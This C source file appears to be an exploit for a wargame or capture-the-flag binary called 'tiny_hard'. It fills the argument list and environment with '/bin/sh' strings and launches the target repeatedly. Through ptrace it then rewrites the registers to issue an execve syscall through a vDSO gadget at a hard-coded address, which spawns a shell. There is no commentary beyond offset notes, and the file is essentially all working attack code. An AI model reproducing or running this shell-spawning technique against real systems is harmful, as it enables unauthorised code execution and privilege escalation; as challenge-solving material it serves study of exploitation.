#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>

// vdso_base = 0x55557000       # 0x55655000
// gadget = vdso_base + 0xb08   # 0xc3c
// syscall = vdso_base + 0xb90  # 0xc90
// ebx = regs.esp + 0x1000 + 0x1a91      # 0x1a93

int main(){
    int status = 0;
    int pid, i;
    struct user_regs_struct regs;
	unsigned long vdso_base = 0x55655000;

    char *argv[27] = {"\x3c\x5c\x65\x55", NULL};
    char *env[1000] = {"/bin/sh", };

    for(i = 1; i < 26; i++){
        argv[i] = "/bin/sh";
    }

    for(i = 1; i< 1000; i++){
        env[i] = "/bin/sh";
    }
    
    while((pid = fork()) >= 0){
        if(pid == 0){
            execve("/home/tiny_hard/tiny_hard", argv, env);
            exit(1);
        }
        else if(pid > 0){
            if(waitpid(pid, &status, 0) < 0){
                printf("[-] something wrong!\n");
                exit(0);
            }

            if(ptrace(PTRACE_GETREGS, pid, 0, &regs) < 0){
                printf("[-] %d failed! %d\n", pid, status);
                continue;
            }

            printf("eip: 0x%08x\n", (unsigned int)regs.eip);
            printf("eax: 0x%08x\n", (unsigned int)regs.eax);
            printf("ecx: 0x%08x\n", (unsigned int)regs.ecx);
            printf("edx: 0x%08x\n", (unsigned int)regs.edx);
            printf("esp: 0x%08x\n", (unsigned int)regs.esp);
            printf("ebp: 0x%08x\n", (unsigned int)regs.ebp);

            regs.eax = 0xb;
            regs.ebx = regs.esp + 0x1000 + 0x19a3;
            regs.eip = vdso_base + 0xc90;

            ptrace(PTRACE_SETREGS, pid, 0, &regs);
            ptrace(PTRACE_DETACH, pid ,0, 0);
            for(;;) sleep(1);
        }
        break;
    }
}

